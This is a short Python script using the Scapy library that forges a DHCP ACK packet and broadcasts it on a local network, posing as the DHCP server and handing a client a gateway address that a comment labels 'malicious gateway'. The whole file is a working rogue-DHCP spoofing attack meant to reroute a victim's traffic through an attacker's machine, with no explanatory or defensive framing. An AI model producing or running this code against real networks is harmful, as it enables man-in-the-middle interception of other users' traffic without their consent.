from scapy.all import *

iface = '\\Device\\NPF_{1E514016-1566-4FDE-888C-281DC2F2883F}'

fake_ack = (Ether(src='34:60:f9:6b:e5:b7', dst='ff:ff:ff:ff:ff:ff') /
            IP(src='192.168.1.1', dst='255.255.255.255') /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, yiaddr='192.168.1.150') /
            DHCP(options=[
                ('message-type', 'ack'),
                ('server_id', '192.168.1.1'),
                ('router', '192.168.1.99'),  # malicious gateway
                ('lease_time', 86400),
                'end'
            ]))

sendp(fake_ack, iface=iface, verbose=0)
print("Sent fake ACK with malicious gateway")